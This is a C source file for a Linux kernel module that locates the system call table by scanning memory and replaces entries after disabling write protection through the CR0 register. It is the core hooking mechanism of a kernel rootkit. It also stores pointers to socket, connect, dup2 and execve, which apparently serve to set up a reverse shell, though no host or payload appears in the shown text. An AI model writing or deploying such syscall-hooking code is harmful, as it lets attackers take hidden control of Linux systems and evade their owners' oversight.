#include <linux/syscalls.h>
#include "cr0.h"

typedef asmlinkage long (*t_sys_open)(const char __user *, int, umode_t);
typedef asmlinkage long (*t_sys_dup)(unsigned int);
typedef asmlinkage long (*t_sys_socket)(int, int, int);
typedef asmlinkage long (*t_sys_connect)(int, struct sockaddr __user *, int);
typedef asmlinkage long (*t_sys_dup2)(unsigned int, unsigned int);
typedef asmlinkage long (*t_sys_execve)(const char __user *, const char __user **, const char __user **);
typedef asmlinkage long (*t_sys_read)(unsigned int, char __user *, size_t);

unsigned long **g_syscalltable;

t_sys_open g_sys_open;
t_sys_dup g_sys_dup;
t_sys_socket g_sys_socket;
t_sys_connect g_sys_connect;
t_sys_dup2 g_sys_dup2;
t_sys_execve g_sys_execve;
t_sys_read g_sys_read;

unsigned long **aquire_sys_call_table(void)
{
	unsigned long int offset = PAGE_OFFSET;
	unsigned long **sct;

	while (offset < ULLONG_MAX) {
		sct = (unsigned long **)offset;

		if (sct[__NR_close] == (unsigned long *) sys_close) 
			return sct;

		offset += sizeof(void *);
	}
	return NULL;
}

bool init_syscall(void)
{
	g_syscalltable = aquire_sys_call_table();
	if(NULL == g_syscalltable) return false;
	g_sys_open = (t_sys_open) g_syscalltable[__NR_open];
	g_sys_dup = (t_sys_dup) g_syscalltable[__NR_dup];
	g_sys_connect = (t_sys_connect) g_syscalltable[__NR_connect];
	g_sys_dup2 = (t_sys_dup2) g_syscalltable[__NR_dup2];
	g_sys_execve = (t_sys_execve) g_syscalltable[__NR_execve];
	g_sys_socket = (t_sys_socket) g_syscalltable[__NR_socket];
	g_sys_read = (t_sys_read) g_syscalltable[__NR_read];
	
	return true;
}

bool hook_syscall(unsigned int nr_call, void *dest_func)
{
	unsigned cr0 = clear_cr0();
	g_syscalltable[nr_call] = dest_func;
	setback_cr0(cr0);
	
	return true;
}
